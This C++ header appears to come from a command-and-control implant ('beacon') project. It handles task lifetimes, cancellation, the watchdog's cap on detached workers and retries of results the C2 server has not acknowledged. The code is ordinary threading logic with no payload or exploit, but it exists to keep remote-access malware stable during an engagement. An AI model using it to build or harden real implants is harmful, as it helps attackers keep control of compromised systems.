#pragma once

// ============================================================================
//  task_lifecycle.h — Task lifetime that outlives the frame that started it
//  ──────────────────────────────────────────────────────────
//  A blocking task (camera Media Foundation ReadSample, a hung shell pipe)
//  must NEVER wedge the beacon loop, but "don't wedge the loop" used to be
//  implemented as: allocate the task state on the stack, detach() the worker,
//  return. The detached worker kept writing into that stack frame after the
//  function returned — a use-after-free that corrupts the beacon's stack and
//  can kill the implant mid-engagement.
//
//  The rule here: STORAGE OUTLIVES THE WATCHDOG. A run is a shared_ptr owned
//  by the watchdog, the worker thread, and (until it is reaped) the registry.
//  Whichever side finishes last drops its reference, and a worker that wakes
//  up after a cancellation finds a live object instead of freed memory.
//
//  Three properties the watchdog needs, all explicit here:
//    1. a terminal state per task, so `timed_out` is distinguishable from
//       `failed` and from `completed` (an operator reading a result must be
//       able to tell "the command failed" from "the command was killed");
//    2. a cancellation token, so a late worker drops its result instead of
//       publishing output for a task the C2 has already been told is dead;
//    3. a cap on detached workers, so a beacon that keeps wedging does not
//       accumulate threads until the process dies.
//
//  Header-only and platform-free on purpose: the beacon builds on MinGW and
//  on POSIX from the same source, and the lifecycle is covered by a
//  compile-and-run test (tests/test_beacon_task_lifecycle.py) rather than by
//  source inspection alone.
// ============================================================================

#ifndef PHANTOM_TASK_LIFECYCLE_H
#define PHANTOM_TASK_LIFECYCLE_H

#include <atomic>
#include <chrono>
#include <condition_variable>
#include <functional>
#include <memory>
#include <mutex>
#include <string>
#include <utility>
#include <vector>

namespace task {

// Terminal (and pre-terminal) states. The names are what the C2 operator
// reads, so they say what HAPPENED, not what the code was doing.
enum class State {
    kPending = 0,
    kRunning,
    kCompleted,    // ran to the end, output published
    kFailed,       // ran to the end and reported an error
    kCancelled,    // cancelled before it could publish
    kTimedOut,     // watchdog gave up; process tree killed
    kKilled,       // cancelled AND the process tree was terminated
    kOrphanReaped, // detached worker finally finished and was reaped
};

inline const char* state_name(State s) {
    switch (s) {
        case State::kPending:      return "pending";
        case State::kRunning:      return "running";
        case State::kCompleted:    return "completed";
        case State::kFailed:       return "failed";
        case State::kCancelled:    return "cancelled";
        case State::kTimedOut:     return "timed_out";
        case State::kKilled:       return "killed";
        case State::kOrphanReaped: return "orphan_reaped";
    }
    return "unknown";
}

// Terminal means "no further transition except the reaper's bookkeeping".
inline bool is_terminal(State s) {
    switch (s) {
        case State::kPending:
        case State::kRunning:
            return false;
        default:
            return true;
    }
}

// How many workers may be outstanding-and-detached at once. A beacon that
// has this many stuck tasks is not going to fix itself; refusing further
// work is honest, spawning a 5th thread into the same broken subsystem is not.
inline constexpr int kMaxDetached = 4;

// One task's state. Cheap to copy the handle, never copied by value.
class Run {
public:
    // Called on the worker thread. Returns the output to publish. Returning
    // an empty string is a legitimate result (`(no output)`), so failure is
    // reported through the return value of publish(), not by emptiness.
    using Work = std::function<std::string()>;

    explicit Run(Work work) : work_(std::move(work)) {}

    Run(const Run&) = delete;
    Run& operator=(const Run&) = delete;

    // ── worker side ────────────────────────────────────────────────────────
    // Publishes the result unless the task was cancelled while running. The
    // mutex is what makes the "cancelled between the check and the write"
    // race impossible: cancel_requested() and the write happen under it.
    bool publish(const std::string& out) {
        std::lock_guard<std::mutex> guard(mu_);
        if (cancel_.load(std::memory_order_acquire)) return false;
        output_ = out;
        state_.store(State::kCompleted, std::memory_order_release);
        cv_.notify_all();
        return true;
    }

    // Marks the run finished-with-error (published, but the command failed).
    bool publish_failure(const std::string& out) {
        std::lock_guard<std::mutex> guard(mu_);
        if (cancel_.load(std::memory_order_acquire)) return false;
        output_ = out;
        state_.store(State::kFailed, std::memory_order_release);
        cv_.notify_all();
        return true;
    }

    // ── watchdog side ──────────────────────────────────────────────────────
    void mark_running() {
        state_.store(State::kRunning, std::memory_order_release);
        cv_.notify_all();
    }

    // Ask the worker to stop. Returns true if this call is the one that
    // moved a still-running task to a terminal state (i.e. the caller is
    // responsible for tearing the process tree down).
    bool request_cancel(State reason) {
        {
            std::lock_guard<std::mutex> guard(mu_);
            if (is_terminal(state_.load(std::memory_order_acquire))) return false;
            cancel_.store(true, std::memory_order_release);
            state_.store(reason, std::memory_order_release);
        }
        cv_.notify_all();
        return true;
    }

    bool cancel_requested() const {
        return cancel_.load(std::memory_order_acquire);
    }

    // Non-blocking: is there nothing left to wait for in the STATE machine?
    // Note this says nothing about the THREAD: request_cancel() moves the
    // state to terminal immediately, while the worker may still be blocked
    // inside work() for ever. Use worker_exited() for the thread.
    bool finished() const {
        return is_terminal(state_.load(std::memory_order_acquire));
    }

    // ── worker-exit bookkeeping ────────────────────────────────────────────
    // The registry must know when the WORKER is gone, not only when the state
    // is terminal. Keying the stranded-worker accounting on `finished()` made
    // it forget a thread the instant it was cancelled, which is why the cap
    // and the shutdown report were both fiction. The worker calls this right
    // before it drops its last reference.
    void mark_worker_exited() {
        worker_exited_.store(true, std::memory_order_release);
    }

    bool worker_exited() const {
        return worker_exited_.load(std::memory_order_acquire);
    }

    // Safe to call from any thread at any time, including after the watchdog
    // gave up: the Run is alive as long as a shared_ptr exists.
    std::string output() const {
        std::lock_guard<std::mutex> guard(mu_);
        return output_;
    }

    State state() const { return state_.load(std::memory_order_acquire); }
    const char* state_name() const { return task::state_name(state()); }

    const Work& work() const { return work_; }

private:
    Work work_;
    std::atomic<State> state_{State::kPending};
    std::atomic<bool> cancel_{false};
    std::atomic<bool> worker_exited_{false};
    mutable std::mutex mu_;
    std::condition_variable cv_;
    std::string output_;
};

// Tracks workers that outlived their watchdog so a cap can be enforced and
// shutdown can drain them. Deliberately process-global: the beacon is
// single-instance by design and a per-caller registry would not see the
// workers from a previous task.
class Registry {
public:
    static Registry& instance() {
        static Registry reg;
        return reg;
    }

    // Registers a detached run. Returns false when the cap is reached, in
    // which case the caller must NOT spawn the thread.
    bool admit(const std::shared_ptr<Run>& run) {
        reap();
        std::lock_guard<std::mutex> guard(mu_);
        if (live_.size() >= static_cast<size_t>(kMaxDetached)) return false;
        live_.push_back(run);
        return true;
    }

    // The worker finished on its own; drop the registry's reference.
    void release(const Run* run) {
        std::lock_guard<std::mutex> guard(mu_);
        for (auto it = live_.begin(); it != live_.end(); ++it) {
            if (it->get() == run) {
                live_.erase(it);
                return;
            }
        }
    }

    size_t live() const {
        std::lock_guard<std::mutex> guard(mu_);
        return live_.size();
    }

    // Cancels everything outstanding at shutdown. Returns how many workers
    // were STILL RUNNING when it gave up on them.
    //
    // It does not — and cannot — wait for a blocked worker. request_cancel()
    // is cooperative and is only observed after work() returns, so waiting
    // for the THREAD would hang the shutdown for ever; waiting for the STATE
    // was pointless because request_cancel() already makes it terminal. So
    // this cancels every run (all the C2 bookkeeping needs) and returns. A
    // worker still trapped inside a syscall dies with the process, and the
    // caller is told how many there were instead of being lied to.
    size_t drain() {
        std::vector<std::shared_ptr<Run>> snapshot;
        {
            std::lock_guard<std::mutex> guard(mu_);
            snapshot = live_;
        }
        for (auto& run : snapshot) run->request_cancel(State::kCancelled);
        size_t abandoned = 0;
        for (auto& run : snapshot) {
            if (!run->worker_exited()) ++abandoned;
        }
        std::lock_guard<std::mutex> guard(mu_);
        live_.clear();
        return abandoned;
    }

    // Drops references to runs whose WORKER has exited. Deliberately NOT
    // keyed on the task state: request_cancel() moves a run to a terminal
    // state immediately, so a state-keyed reap forgot a thread still blocked
    // inside work() — exactly the worker the cap exists to count, which made
    // the cap unreachable in production.
    void reap() {
        std::lock_guard<std::mutex> guard(mu_);
        for (auto it = live_.begin(); it != live_.end();) {
            if ((*it)->worker_exited()) it = live_.erase(it);
            else ++it;
        }
    }

private:
    mutable std::mutex mu_;
    std::vector<std::shared_ptr<Run>> live_;
};

// ── Result-queue drain ─────────────────────────────────────────────────────
// Retry the results the C2 has not acknowledged yet, after a check-in that
// proves the server is reachable. Two failure modes pull in opposite
// directions, and both have bitten this loop:
//
//   * HEAD-OF-LINE BLOCKING: the sends are INDEPENDENT — one result the
//     transport refuses (oversized, malformed, rejected for that task_id)
//     says nothing about the next one. The previous `else break;` stopped
//     the whole queue behind the first bad message, so every result produced
//     after it stayed undelivered (`pending_results` only ever grew).
//
//   * HAMMERING A DEAD LINK: the mirror image. If EVERY attempt fails the
//     channel cannot carry results at all, and issuing one doomed round-trip
//     per queued result just burns the sleep budget. The consecutive-failure
//     counter stops the round once a full batch has failed in a row.
//
// `pending` is compacted IN PLACE (original order preserved) to hold exactly
// the results still undelivered; the delivered ones are dropped. `send` is
// called as `send(task_id, output)` and returns true on delivery. Returns how
// many were delivered.
//
// Header-only and platform-free so the policy is covered by a compile-and-run
// test (tests/test_beacon_task_lifecycle.cpp) instead of a source assertion.
template <typename Send>
inline size_t drain_pending_results(
        std::vector<std::pair<std::string, std::string>>& pending,
        Send&& send) {
    const size_t batch = pending.size();
    size_t delivered = 0;
    size_t consecutive_failures = 0;
    size_t write = 0;                      // compaction cursor
    for (size_t read = 0; read < batch; ++read) {
        if (send(pending[read].first, pending[read].second)) {
            ++delivered;
            consecutive_failures = 0;
            continue;                      // delivered: drop from the queue
        }
        // not delivered: keep it for the next round, in order
        if (write != read) pending[write] = std::move(pending[read]);
        ++write;
        if (++consecutive_failures >= batch) break;   // the link is down
    }
    pending.resize(write);
    return delivered;
}

}  // namespace task

#endif  // PHANTOM_TASK_LIFECYCLE_H